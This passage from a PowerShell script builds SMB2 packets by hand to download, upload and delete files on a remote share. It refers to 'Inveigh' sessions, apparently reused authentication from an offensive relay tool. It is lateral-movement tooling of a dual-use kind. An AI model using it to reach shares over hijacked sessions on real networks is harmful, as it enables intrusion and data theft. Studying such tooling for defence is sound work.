                                $progress_file_size = "" + ($source_file_size / 1024000).ToString('.00') + "MB"
                            }

                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x14
                            $set_info_request_buffer = [System.BitConverter]::GetBytes($source_file_size)
                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                        }
                        else
                        {
                            $stage = 'CreateRequestFindRequest'
                        }

                    }

                    'ReadRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x08,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2ReadRequest $read_request_length $read_request_offset $SMB_file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        Start-Sleep -m 5

                        if($read_request_length -eq 65536)
                        {
                            $i = 0

                            while($client.Available -lt 8192 -and $i -lt 10)
                            {
                                Start-Sleep -m $Sleep
                                $i++
                            }

                        }
                        else
                        {
                            Start-Sleep -m $Sleep
                        }
                        
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Get' -and $action_step -eq 3)
                        {
                            $action_step++
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 7)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($read_request_step / $percent_complete * 100)
                                Write-Progress -Activity "Downloading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $file_bytes = $client_receive[84..($read_request_length + 83)]
    
                            if(!$Modify)
                            {

                                if(!$file_write)
                                {
                                    $file_write = New-Object 'System.IO.FileStream' $destination_path,'Append','Write','Read'
                                }

                                $file_write.Write($file_bytes,0,$file_bytes.Count)
                            }
                            else
                            {
                                $file_memory.AddRange($file_bytes)
                            }

                            if($read_request_step -lt $file_stream_size_quotient)
                            {
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            elseif($read_request_step -eq $file_stream_size_quotient -and $file_stream_size_remainder -ne 0)
                            {
                                $read_request_length = $file_stream_size_remainder
                                $read_request_offset+=65536
                                $read_request_step++
                                $stage = 'ReadRequest'
                            }
                            else
                            {

                                if(!$Modify)
                                {
                                    $file_write.Close()
                                }
                                else
                                {
                                    $file_memory.ToArray()
                                }

                                $output_message = "[+] File downloaded"
                                $stage = 'CloseRequest'
                            }
                            
                        }
                        elseif([System.BitConverter]::ToString($client_receive[12..15]) -ne '03-01-00-00')
                        {
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'CloseRequest'
                        }

                    }

                    'SetInfoRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x11,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2SetInfoRequest $set_info_request_file_info_class $set_info_request_info_level $SMB_file_ID $set_info_request_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($source_file_size -le 65536)
                        {
                            $write_request_length = $source_file_size
                        }
                        else
                        {
                            $write_request_length = 65536
                        }

                        $write_request_offset = 0
                        $write_request_step = 1

                        if($Action -eq 'Delete')
                        {
                            $output_message = "[+] File deleted"
                            $stage = 'CloseRequest'
                            $action_step++
                        }
                        elseif($Action -eq 'Put' -and $action_step -eq 4)
                        {
                            $output_message = "[+] File uploaded"
                            $stage = 'CloseRequest'
                        }
                        else
                        {
                            $stage = 'WriteRequest'
                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x03,0x00 0x1f,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }
                        
                        if($stage -ne 'Exit')
                        {

                            if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                            {
                                $error_code = [System.BitConverter]::ToString($client_receive[12..15])

                                switch($error_code)
                                {

                                    'cc-00-00-c0'
                                    {
                                        $output_message = "[-] Share not found"
                                        $stage = 'Exit'
                                    }

                                    '22-00-00-c0'
                                    {
                                        $output_message = "[-] Access denied"
                                        $stage = 'Exit'
                                    }

                                    default
                                    {
                                        $error_code = $error_code -replace "-",""
                                        $output_message = "[-] Tree connect error code 0x$error_code"
                                        $stage = 'Exit'
                                    }

                                }

                            }
                            elseif($refresh)
                            {
                                Write-Output "[+] Session refreshed"
                                $stage = 'Exit'
                            }
                            elseif(!$SMB_IPC)
                            {
                                $SMB_share_path = "\\" + $Target + "\" + $Share
                                $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_share_path)
                                $SMB_IPC = $true
                                $stage = 'IoctlRequest'
                            }
                            else
                            {

                                if($Action -eq 'Put')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                    $create_request_extra_info = 2
                                }
                                else
                                {
                                    $create_request_extra_info = 1
                                }

                                $tree_ID = $client_receive[40..43]
                                $stage = 'CreateRequest'

                                if($Action -eq 'Get')
                                {
                                    $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                                }

                            }

                        }

                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($inveigh_session -and !$Logoff)
                        {
                            $stage = 'Exit'
                        }
                        else
                        {
                            $stage = 'Logoff'
                        }

                    }
                        
                    'WriteRequest'
                    {

                        if(!$Modify)
                        {
                            $source_file_binary_reader.BaseStream.Seek($write_request_offset,"Begin") > $null
                            $source_file_binary_reader.Read($source_file_buffer,0,$source_file_buffer_size) > $null
                        }
                        else
                        {
                            $source_file_buffer = $Source[$write_request_offset..($write_request_offset+$write_request_length)]
                        }

                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x09,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["CreditCharge"] = 0x01,0x00
                        $packet_SMB2_data = New-PacketSMB2WriteRequest $write_request_length $write_request_offset $SMB_file_ID $source_file_buffer
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data 
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data 
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($write_request_step -lt $source_file_size_quotient)
                        {

                            if(!$NoProgress)
                            {
                                $percent_complete_calculation = [Math]::Truncate($write_request_step / $percent_complete * 100)
                                Write-Progress -Activity "[*] Uploading $source_file - $progress_file_size" -Status "$percent_complete_calculation% Complete:" -PercentComplete $percent_complete_calculation
                            }

                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        elseif($write_request_step -eq $source_file_size_quotient -and $source_file_size_remainder -ne 0)
                        {
                            $write_request_length = $source_file_size_remainder
                            $write_request_offset+=65536
                            $write_request_step++
                            $stage = 'WriteRequest'
                        }
                        else
                        {
                            $action_step++
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x04
                            $set_info_request_buffer = $source_file_creation_time +
                                                        $source_file_last_access_time +
                                                        $source_file_last_write_time +
                                                        $source_file_last_change_time + 
                                                        0x00,0x00,0x00,0x00,
                                                        0x00,0x00,0x00,0x00

                            if(!$Modify)
                            {
                                $stage = 'SetInfoRequest'
                            }
                            else
                            {
                                $output_message = "[+] File uploaded from memory"
                                $stage = 'CloseRequest'
                            }

                        }

                    }
                    
                }
            
            }

        }

    }
    catch
    {
        $error_message = $_.Exception.Message
        $error_message = $error_message -replace "`n",""
        Write-Output "[-] $error_message"
    }
    finally
    {  

        if($file_write.Handle)
        {
            $file_write.Close()
        }

        if($source_file_stream.Handle)
        {
            $source_file_binary_reader.Close()
            $source_file_stream.Close()
        }

        if($inveigh_session -and $Inveigh)
        {
            $inveigh.session_lock_table[$session] = 'open'
            $inveigh.session_message_ID_table[$session] = $message_ID
            $inveigh.session_list[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
        }

        if(!$inveigh_session -or $Logoff)
        {
            $client.Close()
            $client_stream.Close()
        }

    }

}

    if(!$Modify -or $Action -eq 'Put')
    {
        Write-Output $output_message
    }
    elseif($output_message)
    {
        Write-Verbose $output_message
    }

}